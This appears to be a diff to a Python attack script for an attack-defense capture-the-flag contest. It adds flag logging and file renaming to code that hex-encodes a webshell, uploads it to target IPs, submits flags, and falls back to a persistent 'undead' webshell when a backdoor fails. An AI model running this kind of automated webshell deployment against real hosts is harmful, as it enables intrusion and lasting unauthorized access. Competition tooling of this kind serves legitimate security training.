@@ -16,6 +16,25 @@ def loadfile(filepath):  # 加载文件
 ##########################################################################################
 
 
+def rename_file(file_name):  # 重命名旧文件
+    if os.path.exists(file_name):
+        get_time = time.strftime(
+            "%Y-%m-%d_%H_%M_%S", time.localtime(os.path.getmtime(file_name)))
+        old_name = 'flag_list_' + str(get_time) + '.txt'
+        try:
+            os.rename(file_name, old_name)
+            print('Rename file success:' + old_name)
+        except Exception as e:
+            print('Rename file fail:'+str(e))
+##########################################################################################
+
+
+def save_txt(txt):  # 写入flag到文件
+    with open('flag_list.txt', 'a') as file:
+        file.write(txt+'\r')
+##########################################################################################
+
+
 def hex_shell(shell_path='./shell.php'):  # 将webshell转化为hex
     shell_var = loadfile(shell_path).encode('utf-8')
     return shell_var.hex()
@@ -136,6 +155,7 @@ def main():
             if flag != False:
                 udshell_url = up_shell(ip, url_path, method, passwd)
                 submit(ip, flag)
+                save_txt(flag)
             else:  # 原有后门异常后尝试利用不死马
                 udshell_path = udshell_url.replace(
                     'http://', '').replace('ip', '')
@@ -149,10 +169,9 @@ def main():
 
 ##########################################################################################
 if __name__ == '__main__':
-    i = 0
+    rename_file('flag_list.txt')
     try:
-        while 1:
-            i += 1
+        for i in range(1, 100000):
             print("\033[1;33m[开始本轮攻击]\033[0m" +
                   time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+' --> '+str(i))
             main()
